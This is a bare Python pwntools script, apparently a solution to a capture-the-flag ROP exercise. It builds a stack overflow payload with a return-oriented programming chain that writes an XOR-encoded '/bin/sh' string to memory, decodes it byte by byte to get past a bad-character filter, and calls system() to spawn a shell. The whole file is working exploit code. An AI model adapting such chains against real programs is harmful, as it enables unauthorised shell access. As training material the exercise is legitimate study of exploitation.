from pwn import *

system = p64(0x4009e8)
xor = p64(0x400b30) # xor    BYTE PTR [r15],r14b
mov = p64(0x400b34) #     mov    QWORD PTR [r13+0x0],r12
pop_r14_r15 = p64(0x400b40) ##pop r14; pop r15; ret;
pop_r12_r13 = p64(0x400b3b)  #pop r12; pop r13; ret;
padding = p64(0x4009ef)
space = 0x006010f0
### R13 = Address to write
### R12 = string

payload = "A" * 40

def write(string,offset):
    out = ""
    out += pop_r12_r13
    out += string
    out += offset
    out += mov
    return out
def xor_string(string):
    inputbytes = bytearray(string)
    bad_chars = [0x62,0x69,0X63,0x2f,0x20,0x66,0x6e,0x73]
    out = ""
    for i in range(len(inputbytes)):
        out += chr(inputbytes[i] ^ 0x2)
    return out
#wow = p64(0x2d606b6c2d716a02, endianness="big")
# x = xor_string("/bin/bash")
# y = ""
# for i in range(len(x)):
#     inputbytes = bytearray(x)
#     y += chr(inputbytes[i] ^ 0x2)
#
# print y


payload += write(xor_string(" /bin/sh"),p64(space))
#xor
for i in range(0,8):
    payload += pop_r14_r15
    payload += p64(0x2)
    payload += p64(space+i)
    payload += xor

payload += p64(0x400b39)
payload += p64(space)
payload += system
payload += "A"*8

print payload
